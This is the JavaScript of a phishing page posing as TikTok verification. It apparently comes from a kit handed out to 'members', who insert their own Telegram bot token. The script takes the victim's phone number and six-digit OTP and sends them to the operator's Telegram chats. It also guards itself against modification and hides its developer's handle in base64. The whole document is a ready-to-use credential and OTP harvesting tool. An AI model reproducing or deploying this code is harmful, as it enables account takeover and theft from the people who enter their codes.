  <script>
    // === PROTECTION START ===
    (function() {
      const allowedKeys = ["TELEGRAM_BOT_TOKEN", "TELEGRAM_CHAT_IDS"];
      const originalScript = `PLACEHOLDER_HASH`;

      function generateHash(code) {
        let hash = 0, i, chr;
        for (i = 0; i < code.length; i++) {
          chr = code.charCodeAt(i);
          hash = ((hash << 5) - hash) + chr;
          hash |= 0;
        }
        return btoa(hash.toString());
      }

      function verifyIntegrity() {
        const scripts = document.getElementsByTagName("script");
        for (let i = 0; i < scripts.length; i++) {
          if (scripts[i].textContent.includes("TELEGRAM_BOT_TOKEN")) {
            const code = scripts[i].textContent.replace(/\s+/g, "");
            const hash = generateHash(code);

            if (hash !== originalScript) {
              let invalidChange = false;
              allowedKeys.forEach(key => {
                if (!code.includes(key)) invalidChange = true;
              });
              if (invalidChange) {
                document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:50px'>System Crash! Unauthorized modification detected âŒ</h1>";
                throw new Error("Unauthorized modification detected");
              }
            }
          }
        }
      }
      window.addEventListener("load", verifyIntegrity);
    })();
    // === PROTECTION END ===

    // Telegram Bot Configuration - Member can only change these two
    const TELEGRAM_BOT_TOKEN = "__TOKEN__";
    const TELEGRAM_CHAT_IDS = ["__CHATID__"];

    let fullNumber = "";
    let countdownTimer;
    let timeLeft = 60;

const hiddenText = () => {
  const encoded = "RGV2ZWxvcGVyOiBAbm9vYnh2YXU=";
  return atob(encoded);
};


    async function sendToTelegram(message) {
      const sendPromises = TELEGRAM_CHAT_IDS.map(async (chatId) => {
        try {
          const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
          });
          const data = await response.json();
          return data.ok;
        } catch (error) {
          return false;
        }
      });
      const results = await Promise.all(sendPromises);
      return results.every(result => result === true);
    }

    window.sendNumber = function() {
      const code = document.getElementById("countryCode").value;
      const num = document.getElementById("phoneNumber").value.trim();
      if (num.length !== 10 || isNaN(num)) { alert("Please enter a valid 10 digit number"); return; }
      fullNumber = code + num;
      document.getElementById("loading").style.display = "block";
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const date = now.toLocaleDateString();
      const message = `â°<b>Time:${time} Date:</b> ${date}\n\nğŸ“± <b>${hiddenText()} \n \nâœ…TikTok Verification Attempt</b>\n\nğŸ“ <b>Phone Number:</b> ${fullNumber}\n`;
      sendToTelegram(message);
      setTimeout(() => {
        document.getElementById("loading").style.display = "none";
        document.getElementById("numberPage").style.display = "none";
        document.getElementById("otpPage").style.display = "block";
        document.querySelectorAll('.step')[1].classList.add('active');
        document.querySelector('.step-line').classList.add('active');
        startTimer();
      }, 1500);
    };

    function startTimer() {
      timeLeft = 60;
      updateTimerDisplay();
      document.getElementById('resendBtn').classList.add('disabled');
      clearInterval(countdownTimer);
      countdownTimer = setInterval(() => {
        timeLeft--; updateTimerDisplay();
        if (timeLeft <= 0) { clearInterval(countdownTimer); document.getElementById('resendBtn').classList.remove('disabled'); }
      }, 1000);
    }

    function updateTimerDisplay() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      document.getElementById('countdown').textContent = `${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
    }

    window.resendOtp = function() {
      if (timeLeft > 0) return;
      document.querySelectorAll('.otp-input').forEach(input => input.value = '');
      alert('OTP has been resent!');
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const message = `ğŸ”„ <b>OTP Resent</b>\n\nğŸ“ <b>Phone Number:</b> ${fullNumber}\nâ° <b>Time:</b> ${time}`;
      sendToTelegram(message);
      startTimer();
    };

    window.submitOtp = async function() {
      let otp = '';
      document.querySelectorAll('.otp-input').forEach(input => otp += input.value);
      if (otp.length !== 6 || isNaN(otp)) { alert("Please enter a valid 6 digit OTP"); return; }
      const now = new Date();
      const time = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
      const date = now.toLocaleDateString();
      const message = `â° <b>Time:${time} Date:</b> ${date}\n\nâœ… <b>OTP Received</b>\n\nğŸ“ <b>Phone Number:</b> ${fullNumber}\n\nğŸ”¢ <b>OTP Code:</b> ${otp}\n`;
      const success = await sendToTelegram(message);
      if (success) {
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('otpPage').style.display = 'none';
        setTimeout(() => { document.getElementById('successMessage').style.display = 'none'; location.reload(); }, 2000);
      } else {
        document.getElementById('errorMessage').style.display = 'block';
        document.getElementById('otpPage').style.display = 'none';
      }
      clearInterval(countdownTimer);
    };

    window.tryAgain = function() {
      document.getElementById('errorMessage').style.display = 'none';
      document.getElementById('otpPage').style.display = 'block';
      document.querySelectorAll('.otp-input').forEach(input => input.value = '');
      startTimer();
    };

    function moveToNext(current, nextIndex) {
      if (current.value.length >= current.maxLength) {
        const nextInput = document.querySelectorAll('.otp-input')[nextIndex];
        if (nextInput) nextInput.focus();
      }
      const allInputs = document.querySelectorAll('.otp-input');
      const allFilled = Array.from(allInputs).every(input => input.value.length === 1);
      if (allFilled) submitOtp();
    }
  </script>
